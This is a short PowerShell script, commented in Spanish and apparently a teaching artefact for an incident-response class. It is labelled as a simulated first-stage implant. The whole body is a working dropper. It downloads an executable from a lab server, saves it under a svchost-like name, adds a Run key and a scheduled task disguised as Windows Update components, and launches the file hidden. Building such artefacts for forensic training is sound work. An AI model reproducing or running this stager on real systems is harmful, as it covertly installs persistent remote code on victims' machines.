# a.ps1 — artefacto de laboratorio IC UT6 (implante SIMULADO, primer estadio).
# NO EJECUTAR fuera de la VLAN aislada del aula. No contiene malware real: solo
# descarga un binario del servidor del laboratorio y fija persistencia, para que
# el alumnado tenga artefactos reales que analizar. Recuperado del volcado de
# memoria de WIN-XEST-ADM (region RWX del proceso powershell.exe PID 3120).

$ErrorActionPreference = 'SilentlyContinue'
$srv = 'http://10.10.10.66:8080'

# Segundo estadio: descarga del implante
$b   = (New-Object Net.WebClient).DownloadData("$srv/svchost32.exe")
$dst = "$env:LOCALAPPDATA\Temp\svchost32.exe"
[IO.File]::WriteAllBytes($dst, $b)

# Persistencia 1: clave Run del usuario (T1547.001)
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
  -Name 'WindowsUpdate' -Value $dst -PropertyType String -Force

# Persistencia 2: tarea programada al iniciar sesion (T1053.005)
schtasks /Create /TN '\Microsoft\Windows\UpdateOrchestrator\SysHealth' `
  /TR $dst /SC ONLOGON /RL HIGHEST /F

# Ejecuta el implante oculto
Start-Process $dst -WindowStyle Hidden
